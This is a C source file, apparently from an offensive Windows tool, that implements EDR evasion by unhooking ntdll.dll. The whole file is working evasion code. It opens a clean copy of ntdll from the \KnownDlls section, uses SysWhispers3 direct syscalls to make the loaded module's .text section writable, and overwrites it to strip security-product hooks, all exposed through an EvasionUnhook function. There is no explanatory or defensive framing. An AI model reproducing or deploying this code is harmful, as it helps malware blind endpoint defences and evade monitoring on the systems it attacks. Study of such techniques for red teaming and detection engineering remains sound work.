#pragma once
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "Unhook.h"
#include "syswhispers.h"

PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif //_WIN64
    //Reaching to the ntdll.dll module directly - we know its the 2nd image after main module of this program
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

BOOL MapNtdllFromKnownDLLs(OUT PVOID* ppNtdllBuf) {

    HANDLE hSection = NULL;
    PBYTE pNtdllBuffer = NULL;
    NTSTATUS STATUS = NULL;
    UNICODE_STRING UniStr = { 0 };
    OBJECT_ATTRIBUTES ObjAtr = { 0 };

    // constructing UNICODE_STRING of '\KnownDlls\ntdll.dll' 
    UniStr.Buffer = (PWSTR)NTDLL;
    UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
    UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    STATUS = Sw3NtOpenSection(&hSection, SECTION_MAP_READ, &ObjAtr);
    if (STATUS != 0x00) {
        goto _EndOfFunc;
    }

    PVOID pBase = NULL; //base addr for NtMapViewOfSection
    SIZE_T viewSize = 0; //full file/section
    LARGE_INTEGER offset = { 0 }; // start from zero
    STATUS = Sw3NtMapViewOfSection(hSection, (HANDLE)-1, &pBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
    if (STATUS != 0x00 && STATUS != 0x40000003) { //status_success or STATUS_IMAGE_NOT_AT_BASE
        goto _EndOfFunc;
    }

    if (STATUS == 0x40000003) {
        //not exactly a problem, but good for debug
    }

    if (pBase == NULL || viewSize == 0) {
        //empty mapping - bailout
        goto _EndOfFunc;
    }

    *ppNtdllBuf = pBase;

_EndOfFunc:
    if (hSection) CloseHandle(hSection);
    if (*ppNtdllBuf == NULL) return FALSE; else return TRUE;
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

    //get the dos header
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    //get the nt headers
    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PVOID pLocalNtdllTxt = NULL; // local hooked text sect base addr
    PVOID pRemoteNtdllTxt = NULL; // the unhooked text sect base addr
    SIZE_T sNtDllTxtSize = NULL; // size of the text sect

    // getting the text section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
        // the same as if(strcmp(pSectionHeader[i].Name, ".text") == 0)
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtDllTxtSize = pSectionHeader[i].Misc.VirtualSize;
        }
    }

    DWORD dwOldProt = NULL;
    NTSTATUS STATUS = { 0 }; //fur syswhispers

    STATUS = Sw3NtProtectVirtualMemory((HANDLE)-1, &pLocalNtdllTxt, &sNtDllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProt);
    if (STATUS != 0x00) {
        //printf("[!] NtProtectVirtualMemory (first call) failed with error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtDllTxtSize);

    STATUS = Sw3NtProtectVirtualMemory((HANDLE)-1, &pLocalNtdllTxt, &sNtDllTxtSize, dwOldProt, &dwOldProt);
    if (STATUS != 0x00) {
        //printf("[!] NtProtectVirtualMemory (second call) failed with error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

BOOL EvasionUnhook() {
    PVOID pNtDll = NULL;
    if (!MapNtdllFromKnownDLLs(&pNtDll)) return FALSE;
    if (!ReplaceNtdllTxtSection(pNtDll)) return FALSE;
    Sw3NtUnmapViewOfSection((HANDLE)-1, pNtDll);
    return TRUE; //unhooked successfully
}


